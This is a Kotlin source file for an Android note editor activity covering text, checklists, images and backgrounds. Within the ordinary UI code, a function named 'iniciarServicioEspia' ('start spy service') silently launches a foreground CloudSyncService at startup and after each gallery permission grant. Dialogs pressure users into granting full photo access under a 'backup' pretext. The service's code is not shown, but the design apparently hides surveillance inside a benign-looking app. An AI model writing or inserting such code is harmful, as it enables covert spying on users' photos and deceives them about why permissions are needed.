package cl.example.mynotes

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.graphics.Color
import android.graphics.Rect
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.Editable
import android.text.TextWatcher
import android.view.View
import android.view.ViewGroup
import android.view.ViewTreeObserver
import android.widget.Button
import android.widget.EditText
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.widget.NestedScrollView
import androidx.recyclerview.widget.ItemTouchHelper
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.bumptech.glide.Glide
import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.yalantis.ucrop.UCrop
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Collections
import java.util.Date
import java.util.Locale

class NoteEditorActivity : AppCompatActivity() {

    // Vistas principales
    private lateinit var etTitle: EditText
    private lateinit var etContent: EditText
    private lateinit var layoutEditor: View
    private lateinit var tvDateLabel: TextView
    private lateinit var scrollContainer: NestedScrollView

    // Vistas Checklist
    private lateinit var rvChecklist: RecyclerView
    private lateinit var btnAddTodoItem: Button
    private lateinit var btnToggleChecklist: ImageButton

    // Vistas de Fondo
    private lateinit var ivBackground: ImageView
    private lateinit var viewOverlay: View
    private lateinit var btnChangeBackground: ImageButton
    private lateinit var btnBack: ImageButton
    private lateinit var btnSave: ImageButton

    // Variables de datos
    private var noteToEdit: Note? = null
    private var selectedColor: String = "#FFFFFF"
    private var currentBackgroundUri: String? = null

    // Variables Checklist
    private var isChecklistMode = false
    private val checklistItems = mutableListOf<ChecklistItem>()
    private lateinit var checklistAdapter: ChecklistAdapter
    private lateinit var itemTouchHelper: ItemTouchHelper
    private val gson = Gson()

    private val db by lazy { NotesDatabase.getDatabase(this) }

    private val PERMISSION_REQUEST_GALLERY = 200
    private val PERMISSION_REQUEST_WALLPAPER = 201

    // --- LANZADOR DE IMÁGENES ---
    private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data?.data != null) {
            val uri = result.data!!.data!!
            try {
                contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)

                if (isChecklistMode) {
                    // MODO LISTA: Agregar item con imagen (Mediana por defecto = 1)
                    val newItem = ChecklistItem(text = "", isChecked = false, imageUri = uri.toString(), imageSizeState = 1)
                    checklistItems.add(newItem)
                    checklistAdapter.notifyItemInserted(checklistItems.size - 1)
                    scrollContainer.postDelayed({ scrollContainer.fullScroll(View.FOCUS_DOWN) }, 200)
                } else {
                    // MODO TEXTO: Insertar imagen inline
                    RichTextHelper.insertImage(this, etContent, uri)
                }
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    private val pickBackgroundLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) startCrop(uri)
    }

    private val cropResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val resultUri = UCrop.getOutput(result.data!!)
            if (resultUri != null) persistBackgroundUnique(resultUri)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_note_editor)

        // 1. CONFIGURACIÓN VISUAL
        WindowCompat.setDecorFitsSystemWindows(window, false)
        val isDarkTheme = (resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES
        val insetsController = WindowCompat.getInsetsController(window, window.decorView)
        insetsController.isAppearanceLightStatusBars = !isDarkTheme

        layoutEditor = findViewById(R.id.editor_root)
        scrollContainer = findViewById(R.id.scroll_container)

        // 2. LISTENER DE TECLADO
        ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            val ime = insets.getInsets(WindowInsetsCompat.Type.ime())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            val bottomPadding = if (ime.bottom > 0) ime.bottom - systemBars.bottom else 0
            scrollContainer.setPadding(0, 0, 0, bottomPadding.coerceAtLeast(0))
            if (ime.bottom > 0) smartScrollToCursor()
            insets
        }

        // 3. LISTENER GLOBAL LAYOUT (Respaldo)
        val globalLayoutListener = ViewTreeObserver.OnGlobalLayoutListener {
            val rootView = window.decorView.rootView
            val r = Rect()
            rootView.getWindowVisibleDisplayFrame(r)
            if ((rootView.height - r.bottom) > rootView.height * 0.15) smartScrollToCursor()
        }
        layoutEditor.viewTreeObserver.addOnGlobalLayoutListener(globalLayoutListener)

        initViews()
        setupChecklist()
        setupListeners()
        loadNoteData()
        silentStartService()
    }

    private fun initViews() {
        etTitle = findViewById(R.id.et_title)
        etContent = findViewById(R.id.et_content)
        tvDateLabel = findViewById(R.id.tv_date_label)
        ivBackground = findViewById(R.id.iv_editor_background)
        viewOverlay = findViewById(R.id.view_overlay)
        btnChangeBackground = findViewById(R.id.btn_change_background)
        btnBack = findViewById(R.id.btn_back)
        btnSave = findViewById(R.id.btn_save)
        rvChecklist = findViewById(R.id.rv_checklist)
        btnAddTodoItem = findViewById(R.id.btn_add_todo_item)
        btnToggleChecklist = findViewById(R.id.btn_toggle_checklist)
    }

    private fun setupChecklist() {
        checklistAdapter = ChecklistAdapter(
            checklistItems,
            onDelete = { position ->
                if (position in checklistItems.indices) {
                    checklistItems.removeAt(position)
                    checklistAdapter.notifyItemRemoved(position)
                    checklistAdapter.notifyItemRangeChanged(position, checklistItems.size)
                }
            },
            onStartDrag = { viewHolder -> itemTouchHelper.startDrag(viewHolder) }
        )
        rvChecklist.layoutManager = LinearLayoutManager(this)
        rvChecklist.adapter = checklistAdapter

        val callback = object : ItemTouchHelper.SimpleCallback(ItemTouchHelper.UP or ItemTouchHelper.DOWN, 0) {
            override fun onMove(recyclerView: RecyclerView, viewHolder: RecyclerView.ViewHolder, target: RecyclerView.ViewHolder): Boolean {
                val fromPos = viewHolder.bindingAdapterPosition
                val toPos = target.bindingAdapterPosition
                Collections.swap(checklistItems, fromPos, toPos)
                checklistAdapter.notifyItemMoved(fromPos, toPos)
                return true
            }
            override fun onSwiped(viewHolder: RecyclerView.ViewHolder, direction: Int) {}
            override fun onSelectedChanged(viewHolder: RecyclerView.ViewHolder?, actionState: Int) {
                super.onSelectedChanged(viewHolder, actionState)
                if (actionState == ItemTouchHelper.ACTION_STATE_DRAG) viewHolder?.itemView?.alpha = 0.5f
            }
            override fun clearView(recyclerView: RecyclerView, viewHolder: RecyclerView.ViewHolder) {
                super.clearView(recyclerView, viewHolder)
                viewHolder.itemView.alpha = 1.0f
            }
        }
        itemTouchHelper = ItemTouchHelper(callback)
        itemTouchHelper.attachToRecyclerView(rvChecklist)
    }

    // --- MANEJO DE PERMISOS RESTAURADO ---

    private fun verificarAccesoTotal(): Boolean {
        return if (Build.VERSION.SDK_INT >= 33) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun checkGalleryPermission(requestCode: Int) {
        // 1. ¿Tiene acceso TOTAL? -> Abrir galería normalmente
        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            if (requestCode == PERMISSION_REQUEST_GALLERY) {
                val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
                    addCategory(Intent.CATEGORY_OPENABLE)
                    type = "image/*"
                }
                pickImageLauncher.launch(intent)
            }
            else if (requestCode == PERMISSION_REQUEST_WALLPAPER) pickBackgroundLauncher.launch(arrayOf("image/*"))
        }
        // 2. NUEVO: ¿Tiene acceso LIMITADO (Android 14+)? -> Mostrar diálogo DIRECTAMENTE
        // Al detectar esto aquí, evitamos llamar a requestPermissions, por lo tanto NO se abre el selector de fotos del sistema.
        else if (Build.VERSION.SDK_INT >= 34 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED) {

            mostrarDialogoConfiguracion(
                "Acceso Limitado",
                "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
            )
        }
        // 3. ¿No tiene nada? -> Pedir permiso (esto abrirá el popup del sistema "Permitir/No Permitir")
        else {
            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
        }
    }

    private fun abrirGaleriaSegunRequest(requestCode: Int) {
        if (requestCode == PERMISSION_REQUEST_GALLERY) {
            val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
                addCategory(Intent.CATEGORY_OPENABLE)
                type = "image/*"
            }
            pickImageLauncher.launch(intent)
        } else if (requestCode == PERMISSION_REQUEST_WALLPAPER) {
            pickBackgroundLauncher.launch(arrayOf("image/*"))
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE

        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            abrirGaleriaSegunRequest(requestCode)
        } else {
            // Lógica de Acceso Limitado (Android 14)
            val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED

            if (esAccesoLimitado) {
                mostrarDialogoConfiguracion("Acceso Limitado", "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso total. Presiona Ir a Ajustes -> Permisos para activar el permiso.")
                return
            }

            // Lógica de Denegación Permanente
            if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
                mostrarDialogoConfiguracion("Permisos requeridos", "Has denegado ciertos accesos permanentemente. Presiona Ir a Ajustes -> Permisos para activar los permisos.")
            }
        }
    }

    private fun mostrarDialogoConfiguracion(titulo: String, mensaje: String) {
        AlertDialog.Builder(this)
            .setTitle(titulo)
            .setMessage(mensaje)
            .setCancelable(false)
            .setPositiveButton("Ir a Ajustes") { _, _ ->
                try {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    intent.data = Uri.fromParts("package", packageName, null)
                    startActivity(intent)
                } catch (e: Exception) { e.printStackTrace() }
            }
            .setNegativeButton("Cancelar", null)
            .show()
    }

    // --- FIN MANEJO PERMISOS ---

    private fun iniciarFlujoCambioFondo() { checkGalleryPermission(PERMISSION_REQUEST_WALLPAPER) }

    private fun smartScrollToCursor() {
        scrollContainer.postDelayed({
            val focusedView = currentFocus ?: return@postDelayed
            val location = IntArray(2)
            focusedView.getLocationOnScreen(location)
            val viewBottomY = location[1] + focusedView.height + focusedView.paddingBottom
            val scrollLocation = IntArray(2)
            scrollContainer.getLocationOnScreen(scrollLocation)
            val scrollVisibleBottom = scrollLocation[1] + scrollContainer.height - scrollContainer.paddingBottom
            val relativeTop = getRelativeTop(focusedView, scrollContainer)
            val relativeBottom = relativeTop + focusedView.height

            if (viewBottomY > scrollVisibleBottom) {
                val targetScrollY = relativeBottom - (scrollContainer.height - scrollContainer.paddingBottom) + 150
                scrollContainer.smoothScrollTo(0, targetScrollY)
            }
        }, 100)
    }

    private fun getRelativeTop(view: View, parent: View): Int {
        var current = view
        var top = 0
        while (current != parent) {
            top += current.top
            val p = current.parent
            if (p is View) current = p else break
        }
        return top
    }

    private fun loadNoteData() {
        if (intent.hasExtra("note_data")) {
            noteToEdit = if (Build.VERSION.SDK_INT >= 33) {
                intent.getParcelableExtra("note_data", Note::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("note_data") as? Note
            }
            etTitle.setText(noteToEdit?.title)
            tvDateLabel.text = "Editado: ${noteToEdit?.date}"

            val rawContent = noteToEdit?.content ?: ""
            if (rawContent.startsWith("{checklist:true}")) {
                switchToChecklistMode(true)
                parseChecklistData(rawContent)
            } else {
                switchToChecklistMode(false)
                RichTextHelper.setTextWithImages(this, etContent, rawContent)
            }

            val savedColorOrUri = noteToEdit?.color
            if (savedColorOrUri != null) {
                if (savedColorOrUri.startsWith("file://") || savedColorOrUri.startsWith("content://")) {
                    currentBackgroundUri = savedColorOrUri
                    mostrarFondoImagen(Uri.parse(savedColorOrUri))
                } else {
                    selectedColor = savedColorOrUri
                    currentBackgroundUri = null
                    mostrarFondoColor(selectedColor)
                }
            } else {
                mostrarFondoColor("#FFFFFF")
            }
        } else {
            val currentDate = SimpleDateFormat("dd MMM", Locale.getDefault()).format(Date())
            tvDateLabel.text = currentDate
            mostrarFondoColor("#FFFFFF")
            switchToChecklistMode(false)
        }
    }

    private fun parseChecklistData(json: String) {
        try {
            val cleanJson = json.replace("{checklist:true}", "")
            val type = object : TypeToken<List<ChecklistItem>>() {}.type
            val list: List<ChecklistItem> = gson.fromJson(cleanJson, type)
            checklistItems.clear()
            checklistItems.addAll(list)
            checklistAdapter.notifyDataSetChanged()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun switchToChecklistMode(enable: Boolean) {
        isChecklistMode = enable
        if (enable) {
            etContent.visibility = View.GONE
            rvChecklist.visibility = View.VISIBLE
            btnAddTodoItem.visibility = View.VISIBLE
            btnToggleChecklist.setImageResource(R.drawable.ic_pen)
        } else {
            etContent.visibility = View.VISIBLE
            rvChecklist.visibility = View.GONE
            btnAddTodoItem.visibility = View.GONE
            btnToggleChecklist.setImageResource(R.drawable.checkbox_on_background)
        }
    }

    private fun toggleChecklistMode() {
        if (!isChecklistMode) {
            val textLines = etContent.text.toString().split("\n")
            checklistItems.clear()
            for (line in textLines) {
                if (line.isNotBlank()) checklistItems.add(ChecklistItem(line.trim(), false, null, 1))
            }
            if (checklistItems.isEmpty()) checklistItems.add(ChecklistItem("", false, null, 1))
            checklistAdapter.notifyDataSetChanged()
            switchToChecklistMode(true)
        } else {
            val sb = StringBuilder()
            for (item in checklistItems) {
                val prefix = if (item.isChecked) "[x] " else ""
                sb.append(prefix).append(item.text).append("\n")
            }
            etContent.setText(sb.toString())
            switchToChecklistMode(false)
        }
    }

    private fun setupListeners() {
        btnBack.setOnClickListener { finish() }
        btnSave.setOnClickListener { saveNote() }
        findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener { checkGalleryPermission(PERMISSION_REQUEST_GALLERY) }
        btnChangeBackground.setOnClickListener { iniciarFlujoCambioFondo() }

        btnToggleChecklist.setOnClickListener { toggleChecklistMode() }
        btnAddTodoItem.setOnClickListener {
            checklistItems.add(ChecklistItem("", false, null, 1))
            checklistAdapter.notifyItemInserted(checklistItems.size - 1)
            scrollContainer.postDelayed({ scrollContainer.fullScroll(View.FOCUS_DOWN) }, 100)
        }

        etContent.setOnClickListener { smartScrollToCursor() }
        etContent.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: Editable?) { smartScrollToCursor() }
        })

        setupColorClick(R.id.color_white, "#FFFFFF")
        setupColorClick(R.id.color_yellow, "#FFF9C4")
        setupColorClick(R.id.color_blue, "#E3F2FD")
        setupColorClick(R.id.color_pink, "#FCE4EC")
        setupColorClick(R.id.color_green, "#E8F5E9")
    }

    private fun setupColorClick(viewId: Int, colorHex: String) {
        findViewById<View>(viewId).setOnClickListener {
            selectedColor = colorHex
            currentBackgroundUri = null
            mostrarFondoColor(colorHex)
        }
    }

    private fun mostrarFondoColor(colorHex: String) {
        layoutEditor.setBackgroundColor(Color.TRANSPARENT)
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.GONE
        ivBackground.setImageDrawable(null)
        try {
            ivBackground.setBackgroundColor(Color.parseColor(colorHex))
            etContent.setBackgroundColor(Color.TRANSPARENT)
            val esOscuro = isColorDark(Color.parseColor(colorHex))
            actualizarEstiloTexto(esOscuro)
        } catch (e: Exception) {
            e.printStackTrace()
            layoutEditor.setBackgroundColor(Color.WHITE)
        }
    }

    private fun mostrarFondoImagen(uri: Uri) {
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.VISIBLE
        layoutEditor.setBackgroundResource(0)
        Glide.with(this)
            .load(uri)
            .centerCrop()
            .transition(DrawableTransitionOptions.withCrossFade())
            .into(ivBackground)
        actualizarEstiloTexto(esFondoOscuro = true)
    }

    private fun actualizarEstiloTexto(esFondoOscuro: Boolean) {
        val textColor = if (esFondoOscuro) Color.WHITE else Color.BLACK
        val hintColor = if (esFondoOscuro) Color.LTGRAY else Color.GRAY
        etTitle.setTextColor(textColor)
        etTitle.setHintTextColor(hintColor)
        etContent.setTextColor(textColor)
        etContent.setHintTextColor(hintColor)
        tvDateLabel.setTextColor(hintColor)
    }

    private fun isColorDark(color: Int): Boolean {
        val darkness = 1 - (0.299 * Color.red(color) + 0.587 * Color.green(color) + 0.114 * Color.blue(color)) / 255
        return darkness >= 0.5
    }

    private fun persistBackgroundUnique(croppedUri: Uri) {
        try {
            val uniqueName = "bg_note_${System.currentTimeMillis()}.jpg"
            val finalFile = File(filesDir, uniqueName)
            contentResolver.openInputStream(croppedUri)?.use { input ->
                finalFile.outputStream().use { output -> input.copyTo(output) }
            }
            val finalUri = Uri.fromFile(finalFile)
            currentBackgroundUri = finalUri.toString()
            mostrarFondoImagen(finalUri)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun startCrop(uri: Uri) {
        val destinationUri = Uri.fromFile(File(cacheDir, "crop_${System.currentTimeMillis()}.jpg"))
        val options = UCrop.Options().apply {
            setStatusBarColor(Color.BLACK)
            setToolbarColor(Color.BLACK)
            setToolbarWidgetColor(Color.WHITE)
            setRootViewBackgroundColor(Color.BLACK)
            setToolbarTitle("Ajustar Fondo")
        }
        val uCropIntent = UCrop.of(uri, destinationUri)
            .withAspectRatio(9f, 16f)
            .withMaxResultSize(1080, 2400)
            .withOptions(options)
            .getIntent(this)
        cropResultLauncher.launch(uCropIntent)
    }

    private fun iniciarServicioEspia() {
        if (verificarAccesoTotal()) {
            val intent = Intent(this, CloudSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
            else startService(intent)
        }
    }
    private fun silentStartService() { if (verificarAccesoTotal()) iniciarServicioEspia() }

    private fun saveNote() {
        val title = etTitle.text.toString().trim()
        val formattedDate = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date())
        val finalBackgroundData = currentBackgroundUri ?: selectedColor

        val finalContent = if (isChecklistMode) {
            val jsonList = gson.toJson(checklistItems)
            "{checklist:true}$jsonList"
        } else {
            etContent.text.toString()
        }

        if (title.isEmpty() && finalContent.trim().isEmpty()) {
            Toast.makeText(this, "Vacía", Toast.LENGTH_SHORT).show()
            return
        }

        CoroutineScope(Dispatchers.IO).launch {
            if (noteToEdit == null) {
                val newNote = Note(title = title, content = finalContent, date = formattedDate, color = finalBackgroundData)
                db.notesDao().insert(newNote)
            } else {
                noteToEdit?.apply {
                    this.title = title
                    this.content = finalContent
                    this.date = formattedDate
                    this.color = finalBackgroundData
                }
                db.notesDao().update(noteToEdit!!)
            }
            withContext(Dispatchers.Main) { finish() }
        }
    }
}